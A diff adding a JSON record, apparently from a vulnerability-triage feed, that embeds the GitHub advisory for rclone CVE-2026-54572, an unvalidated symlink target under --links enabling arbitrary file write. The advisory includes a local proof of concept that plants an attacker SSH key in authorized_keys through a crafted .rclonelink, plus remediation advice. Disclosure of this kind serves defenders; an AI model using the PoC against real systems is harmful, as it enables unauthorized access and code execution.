@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/159286161?v=4\", \"events_url\": \"https://api.github.com/users/vnth4nhnt/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/vnth4nhnt/followers\", \"following_url\": \"https://api.github.com/users/vnth4nhnt/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/vnth4nhnt/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/vnth4nhnt\", \"id\": 159286161, \"login\": \"vnth4nhnt\", \"node_id\": \"U_kgDOCX6DkQ\", \"organizations_url\": \"https://api.github.com/users/vnth4nhnt/orgs\", \"received_events_url\": \"https://api.github.com/users/vnth4nhnt/received_events\", \"repos_url\": \"https://api.github.com/users/vnth4nhnt/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/vnth4nhnt/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/vnth4nhnt/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/vnth4nhnt\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/536803?v=4\", \"events_url\": \"https://api.github.com/users/ncw/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/ncw/followers\", \"following_url\": \"https://api.github.com/users/ncw/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ncw/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/ncw\", \"id\": 536803, \"login\": \"ncw\", \"node_id\": \"MDQ6VXNlcjUzNjgwMw==\", \"organizations_url\": \"https://api.github.com/users/ncw/orgs\", \"received_events_url\": \"https://api.github.com/users/ncw/received_events\", \"repos_url\": \"https://api.github.com/users/ncw/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/ncw/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ncw/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/ncw\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54572\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-59\", \"name\": \"Improper Link Resolution Before File Access ('Link Following')\"}], \"description\": \"### Summary\\nWith `-l/--links`, rclone serializes symlinks as `<name>.rclonelink` text objects whose body is the link target. When rclone writes such an object to a local destination, it recreates the symlink with `os.Symlink(<object body>, <dest path>)` and performs NO validation of the target. If the source is attacker-controlled, the attacker sets the body to any absolute or `../` path, so rclone plants a symlink inside the destination that points anywhere on the victim's filesystem. Because a sibling object named `<name>.rclonelink` sorts before `<name>/...`, rclone creates the escaping symlink first and then writes a following object \\\"inside\\\" it; `mkdirAll`/`OpenFile` follow the planted symlink, so the file lands OUTSIDE the destination with attacker-chosen contents. This yields arbitrary file write as the victim user, e.g. overwriting `~/.ssh/authorized_keys`, `~/.bashrc`, or a crontab — i.e. code execution.\\n\\n### Details\\n`backend/local/local.go`, `Object.Update()`:\\n```go\\n} else {\\n    out = nopWriterCloser{&symlinkData}          // body of <name>.rclonelink = attacker data\\n}\\n...\\nif o.translatedLink {\\n    if err == nil {\\n        if _, err := os.Lstat(o.path); err == nil {\\n            os.Remove(o.path)\\n        }\\n        // Use the contents for the copied object to create a symlink\\n        err = os.Symlink(symlinkData.String(), o.path)   // <-- target NEVER validated (abs / .. allowed)\\n    }\\n}\\n```\\n`symlinkData` is the raw body of the source object, fully attacker-controlled when copying from an untrusted remote. There is no check that the target is relative or stays within the destination. The subsequent write path (`mkdirAll()` → `file.MkdirAll`, then `file.OpenFile(..., O_CREATE)`) follows existing symlink components with no `O_NOFOLLOW`, so a file written under the planted symlinked directory escapes the destination.\\n\\n### PoC\\n1) Get the official stable binary:\\n```\\ncurl -fsSLO https://downloads.rclone.org/v1.74.3/rclone-v1.74.3-linux-amd64.zip\\nunzip -j rclone-v1.74.3-linux-amd64.zip '*/rclone' -d .      # ./rclone -> v1.74.3\\n```\\n2) Create an attacker-controlled \\\"remote\\\" (two objects) and a victim layout:\\n```\\nmkdir -p evil/pwn dest victimhome/.ssh\\nprintf '%s' \\\"$PWD/victimhome/.ssh\\\" > evil/pwn.rclonelink              # body = abs path OUTSIDE dest\\nprintf 'ssh-ed25519 AAAA_ATTACKER_KEY pwned\\\\n' > evil/pwn/authorized_keys\\nls -l victimhome/.ssh                                                 # empty (before)\\n```\\n3) Serve the malicious remote (models any untrusted remote — bucket / WebDAV / HTTP share):\\n```\\ncd evil && python3 -m http.server 38080 --bind 127.0.0.1\\n```\\n4) VICTIM ACTION — back up the untrusted remote preserving symlinks:\\n```\\n./rclone copy --links --http-url http://127.0.0.1:38080 :http: ./dest -v\\n```\\n5) Observe — a file landed OUTSIDE `./dest`:\\n```\\nls -l dest/pwn                       # dest/pwn -> .../victimhome/.ssh   (symlink escapes dest)\\ncat victimhome/.ssh/authorized_keys  # ssh-ed25519 AAAA_ATTACKER_KEY pwned   <-- written outside dest\\n```\\n`pwn.rclonelink` sorts before `pwn/authorized_keys`, so rclone creates the escaping symlink first and the next write follows it out of the destination. With rclone run as the victim user this overwrites `~/.ssh/authorized_keys`, `~/.bashrc`, or a crontab → code execution.\\n\\n### Impact\\nAn attacker who controls the contents of any remote a victim syncs with `-l/--links` gains arbitrary file write as the victim user, anywhere that user can write. Overwriting `~/.ssh/authorized_keys`, shell rc files, or cron files yields remote code execution on the victim's host. Even without the write-through step, the destination is silently populated with symlinks pointing anywhere on the local filesystem (confinement break / later read-or-write traversal).\\n\\n### Remediation\\nIn `Object.Update()` reject symlink targets that are absolute or escape the destination root before calling `os.Symlink` (resolve `filepath.Join(dir, target)` and require it to stay within the configured root, or refuse absolute/`..` targets), and write objects with `O_NOFOLLOW` on the final component plus a no-symlink-in-parent check so a planted symlinked directory is never followed. Add a regression test copying a `.rclonelink` with target `/tmp/...` and a sibling file, asserting nothing is written outside the destination.\", \"epss\": {\"percentage\": 0.00309, \"percentile\": 0.23135}, \"ghsa_id\": \"GHSA-cf44-9pgv-m4xc\", \"github_reviewed_at\": \"2026-08-05T20:15:01Z\", \"html_url\": \"https://github.com/advisories/GHSA-cf44-9pgv-m4xc\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-cf44-9pgv-m4xc\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54572\"}], \"nvd_published_at\": \"2026-07-14T22:17:16Z\", \"published_at\": \"2026-08-05T20:15:01Z\", \"references\": [\"https://github.com/rclone/rclone/security/advisories/GHSA-cf44-9pgv-m4xc\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-54572\", \"https://github.com/rclone/rclone/commit/1154afebee986180b489084d38e2a0c578751498\", \"https://github.com/rclone/rclone/commit/874a804f5289517defdd7de68b2a374837080265\", \"https://github.com/rclone/rclone/releases/tag/v1.74.4\", \"https://github.com/advisories/GHSA-cf44-9pgv-m4xc\"], \"repository_advisory_url\": \"https://api.github.com/repos/rclone/rclone/security-advisories/GHSA-cf44-9pgv-m4xc\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/rclone/rclone\", \"summary\": \"rclone: Unvalidated symlink target in local `--links` — arbitrary file write from an untrusted remote\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-05T20:15:03Z\", \"url\": \"https://api.github.com/advisories/GHSA-cf44-9pgv-m4xc\", \"vulnerabilities\": [{\"first_patched_version\": \"1.74.4\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/rclone/rclone\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.74.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-cf44-9pgv-m4xc",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/rclone/rclone: <= 1.74.3"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-54572"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/rclone/rclone"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-08-07T10:22:59.594898Z",
+  "provenance": {
+    "content_sha256": "6ba134dde7f10ce3f011c67a0d8c89adaa10a397062705fdcec9a3102554e354",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-05T20:15:01Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-cf44-9pgv-m4xc",
+  "status": "active",
+  "title": "rclone: Unvalidated symlink target in local `--links` — arbitrary file write from an untrusted remote",
+  "updated_at": "2026-08-05T20:15:03Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-cf44-9pgv-m4xc"
+}
